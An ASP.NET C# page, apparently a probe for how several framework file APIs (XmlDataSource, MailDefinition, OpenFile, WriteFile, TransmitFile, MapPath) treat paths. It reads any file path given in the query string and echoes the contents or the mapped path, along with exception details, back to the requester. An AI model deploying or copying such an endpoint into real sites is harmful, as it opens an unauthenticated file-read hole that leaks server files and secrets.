<%@ Page Language="C#" %>
<%@ Import Namespace="System.Web.UI.WebControls" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e) {
        string k = Request.QueryString["k"];
        string p = Request.QueryString["p"];
        try {
            if (k == "xml") {
                XmlDataSource ds = new XmlDataSource();
                ds.EnableCaching = false;
                Controls.Add(ds);
                ds.DataFile = p;
                Response.Write("xml=" + ds.GetXmlDocument().DocumentElement.OuterXml);
            }
            else if (k == "mail") {
                MailDefinition md = new MailDefinition();
                md.From = "a@b.c";
                md.BodyFileName = p;
                System.Net.Mail.MailMessage m = md.CreateMailMessage("x@y.z", null, this);
                Response.Write("body=" + m.Body);
            }
            else if (k == "open") Response.Write("open=" + new System.IO.StreamReader(OpenFile(p)).ReadToEnd());
            else if (k == "secure") Response.Write("secure=" + MapPathSecure(p));
            else if (k == "w") { Response.Write("write="); Response.WriteFile(p); }
            else if (k == "t") { Response.Write("transmit="); Response.TransmitFile(p); }
            else if (k == "map") Response.Write("map=" + Server.MapPath(p));
            else if (k == "rmap") Response.Write("rmap=" + Request.MapPath(p));
        }
        catch (Exception ex) { Response.Write("EX " + ex.GetType().Name + ": " + ex.Message); }
    }
</script>
